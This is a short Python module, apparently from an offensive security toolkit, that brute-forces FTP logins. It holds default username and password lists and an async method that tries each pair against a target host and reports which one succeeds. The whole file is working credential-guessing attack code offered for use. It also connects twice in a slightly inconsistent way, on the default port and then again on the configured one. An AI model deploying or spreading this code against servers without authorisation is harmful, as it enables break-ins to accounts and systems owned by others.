
import asyncio
import ftplib

from ...payloads.base import Credentials
from .base import BruteForceBase


class FTPBruteForce(BruteForceBase):

    def get_default_username_list(self) -> list[str]:
        return ['anonymous', 'ftp', 'admin', 'user', 'test']

    def get_default_password_list(self) -> list[str]:
        return ['', 'anonymous', 'password', 'admin', '123456']

    async def try_credentials(self, credentials: Credentials) -> bool:

        def _try_sync():
            try:
                ftp = ftplib.FTP(self.host)
                ftp.connect(port=self.port, timeout=self.timeout)
                ftp.login(credentials.username, credentials.password)
                ftp.quit()
                return True
            except (ftplib.error_perm, ftplib.error_temp, OSError):
                return False
            except EOFError:
                return False

        loop = asyncio.get_event_loop()
        return await loop.run_in_executor(None, _try_sync)
